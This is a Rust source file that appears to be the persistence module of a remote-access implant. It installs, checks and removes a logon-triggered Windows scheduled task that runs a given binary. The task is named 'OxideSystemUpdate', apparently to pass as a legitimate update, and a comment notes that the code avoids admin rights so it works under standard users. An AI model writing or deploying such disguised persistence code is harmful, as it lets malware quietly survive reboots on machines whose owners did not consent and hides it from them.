use crate::persistence::PersistenceTrait;
use std::path::Path;
use std::process::Command;

pub struct ScheduledTaskPersistence;
const TASK_NAME: &str = "OxideSystemUpdate";

impl PersistenceTrait for ScheduledTaskPersistence {
    fn install(&self, binary_path: &Path) -> anyhow::Result<()> {
        let s = binary_path.to_str().ok_or_else(|| anyhow::anyhow!("invalid path"))?;
        // No /rl highest — requires admin, fails for standard users.
        let status = Command::new("schtasks")
            .args(["/create", "/f", "/sc", "onlogon", "/tn", TASK_NAME, "/tr", s])
            .status()?;
        anyhow::ensure!(status.success(), "schtasks /create failed");
        Ok(())
    }
    fn remove(&self) -> anyhow::Result<()> {
        let s = Command::new("schtasks").args(["/delete", "/f", "/tn", TASK_NAME]).status()?;
        anyhow::ensure!(s.success(), "schtasks /delete failed");
        Ok(())
    }
    fn check(&self) -> bool {
        Command::new("schtasks").args(["/query", "/tn", TASK_NAME])
            .output().map(|o| o.status.success()).unwrap_or(false)
    }
    fn name(&self) -> &'static str { "scheduled_task" }
}

#[cfg(test)]
mod tests {
    use super::*;
    #[test]
    fn task_name_stable() { assert_eq!(TASK_NAME, "OxideSystemUpdate"); }
}
